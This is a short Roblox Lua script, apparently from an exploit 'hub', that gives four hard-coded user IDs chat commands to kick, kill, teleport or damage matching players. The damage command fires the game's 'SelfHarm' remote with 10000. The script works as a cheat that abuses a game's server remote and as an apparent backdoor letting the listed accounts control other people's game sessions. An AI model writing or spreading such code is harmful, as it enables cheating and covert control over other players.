local admins = {
	[248924950] = true,
	[2361327414] = true,
	[4019040138] = true,
	[2524525918] = true,
}

function FindUser(Partial)
	for _, player in pairs(game:GetService("Players"):GetPlayers()) do
		if player.Name:lower():match(Partial:lower()) then
			return player
		end
	end
	return nil
end

local commands = {
	kick = function(targetPlayer)
		targetPlayer:Kick("vvhub3301n1n")
	end,
	teleport = function(targetPlayer, adminPlayer)
		if adminPlayer.Character and targetPlayer.Character then
			targetPlayer.Character.HumanoidRootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame
		end
	end,
	kill = function(targetPlayer)
		targetPlayer.Character.Humanoid.Health = 0
	end,
	down = function(targetPlayer)
		local args = {
			[1] = 10000
		}

		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
	end,
}

local function HandlePlayerChat(Msg, player)
	local command, target = Msg:lower():match("^/?e%s+([^%s]+)%s+(.*)$")
	if not command then
		command, target = Msg:lower():match("^/?([^%s]+)%s+(.*)$")
	end
	if command and commands[command] then
		local targetPlayer = FindUser(target)
		if targetPlayer then
			commands[command](targetPlayer, player)
		else
			return
		end
	elseif not commands[command] then
		return
	end
end

local function ConnectPlayer(player)
	if admins[player.UserId] then
		player.Chatted:Connect(function(Msg)
			HandlePlayerChat(Msg, player)
		end)
	end
end

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
	ConnectPlayer(player)
end

game:GetService("Players").PlayerAdded:Connect(ConnectPlayer)
